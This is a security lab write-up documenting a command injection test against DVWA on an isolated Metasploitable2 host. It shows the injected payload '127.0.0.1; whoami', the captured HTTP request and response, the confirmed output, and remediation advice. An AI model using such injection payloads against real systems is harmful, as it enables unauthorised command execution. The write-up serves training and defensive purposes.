# **03 – Web Vulnerability Testing (DVWA Command Injection)**

# **Target & Environment**

| Component            | Value                                        |
| -------------------- | -------------------------------------------- |
| Analyst Machine      | Ubuntu (10.0.0.10)                           |
| Target Host          | Metasploitable2 (10.0.0.20)                  |
| DVWA Security Level  | Low                                          |
| Vulnerability Tested | Command Injection (a.k.a. Command Execution) |

All testing was performed inside an isolated VirtualBox lab with no external connectivity.

---

# **1. Objective**

Perform hands-on vulnerability testing against **DVWA (Damn Vulnerable Web App)** on the Metasploitable2 host by exploiting the **Command Injection** vulnerability. Capture and document the full HTTP request/response and confirm code execution on the server.

---

# **2. Vulnerability Description**

**Command Injection** occurs when user-controlled input is passed directly to the system shell without proper validation or sanitization.

In DVWA Low Security mode, the **`ip`** parameter in the Command Execution module is concatenated directly into a shell command such as:

```
ping -c 3 [IP]
```

If an attacker injects a shell separator, such as `;`, they can append arbitrary OS commands.

Example payload:

```
127.0.0.1; whoami
```

---

# **3. Steps Performed**

## **3.1 Navigated to DVWA Command Execution**

DVWA > Vulnerabilities > Command Execution
Returned normal ping output when entering `127.0.0.1`.

## **3.2 Injected a Malicious Payload**

Submitted the following via the browser:

```
127.0.0.1; whoami
```

The webpage returned the normal ping output *plus* the result of `whoami`, confirming arbitrary command execution.

---

# **4. Captured HTTP Request (tcpdump)**

From tcpdump packet:

```
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: 10.0.0.20
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.0.0.20
Referer: http://10.0.0.20/dvwa/vulnerabilities/exec/
Cookie: security=low; PHPSESSID=af5efefe4a6debffa45fd399438c7ba4

ip=127.0.0.1%3B+whoami&submit=submit
```

### **Key Points**

* The payload was URL-encoded:
  `127.0.0.1%3B+whoami`
  (`%3B` = semicolon)
* The vulnerable parameter is **`ip`**.
* DVWA Low security does not sanitize this value.

---

# **5. Captured HTTP Response (Initial Headers)**

```
HTTP/1.1 200 OK
Date: Thu, 11 Dec 2025 16:49:57 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Pragma: no-cache
Cache-Control: no-cache, must-revalidate
Content-Length: 4719
Content-Type: text/html;charset=utf-8
```

The response later contained HTML for the DVWA page plus the injected command output.

---

# **6. Evidence of Successful Exploitation**

The DVWA page output returned:

```
www-data
```

This is the effective username of the Apache HTTPD worker process on Ubuntu, proving the injected `whoami` was executed server-side.

---

# **7. Analysis**

| Component            | Result                                     |
| -------------------- | ------------------------------------------ |
| Vulnerable Parameter | `ip` (POST body)                           |
| Attack Type          | OS Command Injection                       |
| Payload              | `127.0.0.1; whoami`                        |
| Result               | Server executed attacker-supplied command  |
| Execution Context    | `www-data` (webserver user)                |
| Risk                 | High – full remote code execution possible |

An attacker could escalate this to:

* Reverse shells
* Local enumeration
* File reads/writes
* Privilege escalation
* Persistence

---

# **8. Impact**

Command injection is one of the highest-impact web vulnerabilities.
In a real-world system, this would be classified as:

**Critical (CVSS 9.0–10.0)**
due to the ability to run arbitrary commands on the underlying OS.

---

# **9. Remediation Recommendations**

* Implement strict input validation (whitelisting IP address format).
* Escape or remove shell metacharacters (`;`, `|`, `&`, `&&`, `||`).
* Use safer system call wrappers such as Python `subprocess.run()` with arrays.
* Disable direct shell invocation where possible.
* Run web services with minimal privileges (least privilege).
* Deploy a WAF to detect/mitigate malicious command patterns.

---

# **10. Conclusion**

This exercise demonstrated a full command injection attack against DVWA in Low security mode. Using packet capture, we confirmed:

* Attack payload injection
* Complete HTTP request
* Complete HTTP response
* Successful execution of arbitrary commands (`whoami`)

---
